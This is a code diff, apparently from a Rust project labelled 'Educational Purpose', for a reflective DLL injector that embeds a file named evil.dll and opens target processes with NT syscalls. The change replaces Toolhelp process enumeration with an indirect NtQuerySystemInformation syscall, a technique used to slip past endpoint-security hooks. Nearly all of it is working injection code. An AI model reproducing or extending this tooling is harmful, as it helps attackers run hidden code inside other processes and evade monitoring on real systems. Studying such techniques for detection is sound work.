@@ -27,14 +27,18 @@
     Auteur: Educational Purpose
 */
 
-use rust_syscalls::syscall;
+// Module syscalls local
+mod syscalls;
+
 use std::mem::zeroed;
 use std::ptr::null_mut;
-use winapi::ctypes::c_void;
+use libc::c_void;
+
+// Types NT via ntapi et winapi
+use ntapi::ntapi_base::CLIENT_ID;
+use ntapi::ntexapi::{PSYSTEM_PROCESS_INFORMATION, SystemProcessInformation};
 use winapi::shared::ntdef::{HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES};
 use winapi::shared::ntstatus::STATUS_SUCCESS;
-use winapi::um::handleapi::CloseHandle;
-use winapi::um::tlhelp32::*;
 
 // ============================================================
 // CONSTANTES MÉMOIRE
@@ -58,16 +62,8 @@ const MINIMUM_ACCESS: u32 = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCE
 const DLL_BYTES: &[u8] = include_bytes!("../../reflective_dll/evil.dll");
 
 // ============================================================
-// STRUCTURES POUR NtOpenProcess
-// ============================================================
-#[repr(C)]
-struct ClientId {
-    unique_process: HANDLE,
-    unique_thread: HANDLE,
-}
-
-// ============================================================
 // STRUCTURES PE POUR PARSER LES EXPORTS
+// (ClientId vient maintenant de ntapi::ntpsapi::CLIENT_ID)
 // ============================================================
 #[repr(C)]
 struct DosHeader {
@@ -296,33 +292,50 @@ fn find_reflective_loader_offset(dll_bytes: &[u8]) -> Result<u32, String> {
 /// Trouve le PID d'un processus par son nom
 fn find_process_pid(target_name: &str) -> Option<u32> {
     unsafe {
-        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-        if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
+        // Buffer initial (1MB devrait suffire pour la plupart des systèmes)
+        let buffer_size: u32 = 1024 * 1024;
+        let mut buffer: Vec<u8> = vec![0; buffer_size as usize];
+        let mut return_length: u32 = 0;
+
+        // Syscall NtQuerySystemInformation (indirect)
+        let status: i32 = syscall!(
+            "NtQuerySystemInformation",
+            SystemProcessInformation as u32,
+            buffer.as_mut_ptr() as *mut c_void,
+            buffer_size,
+            &mut return_length as *mut u32
+        );
+
+        if status != 0 {
+            eprintln!("[✗] NtQuerySystemInformation failed: {:#X}", status);
             return None;
         }
 
-        let mut entry: PROCESSENTRY32W = zeroed();
-        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
+        // Parser la liste chaînée SYSTEM_PROCESS_INFORMATION
+        let mut offset = 0usize;
+        loop {
+            let entry = &*(buffer.as_ptr().add(offset) as PSYSTEM_PROCESS_INFORMATION);
 
-        if Process32FirstW(snapshot, &mut entry) != 0 {
-            loop {
-                let name = String::from_utf16_lossy(&entry.szExeFile)
-                    .trim_end_matches('\0')
-                    .to_lowercase();
+            // Vérifier le nom du processus (Unicode)
+            if !entry.ImageName.Buffer.is_null() && entry.ImageName.Length > 0 {
+                let name_slice = std::slice::from_raw_parts(
+                    entry.ImageName.Buffer,
+                    (entry.ImageName.Length / 2) as usize,
+                );
+                let name = String::from_utf16_lossy(name_slice).to_lowercase();
 
                 if name == target_name.to_lowercase() {
-                    let pid = entry.th32ProcessID;
-                    CloseHandle(snapshot);
-                    return Some(pid);
-                }
-
-                if Process32NextW(snapshot, &mut entry) == 0 {
-                    break;
+                    return Some(entry.UniqueProcessId as u32);
                 }
             }
+
+            // NextEntryOffset = 0 signifie fin de liste
+            if entry.NextEntryOffset == 0 {
+                break;
+            }
+            offset += entry.NextEntryOffset as usize;
         }
 
-        CloseHandle(snapshot);
         None
     }
 }
@@ -351,9 +364,9 @@ fn inject_reflective_dll(
         let mut obj_attr: OBJECT_ATTRIBUTES = zeroed();
         obj_attr.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
 
-        let mut client_id = ClientId {
-            unique_process: target_pid as HANDLE,
-            unique_thread: null_mut(),
+        let mut client_id = CLIENT_ID {
+            UniqueProcess: target_pid as HANDLE,
+            UniqueThread: null_mut(),
         };
 
         let status: NTSTATUS = syscall!(
@@ -361,7 +374,7 @@ fn inject_reflective_dll(
             &mut h_process as *mut HANDLE,
             MINIMUM_ACCESS,
             &mut obj_attr as *mut OBJECT_ATTRIBUTES,
-            &mut client_id as *mut ClientId
+            &mut client_id as *mut CLIENT_ID
         );
 
         if status != STATUS_SUCCESS {
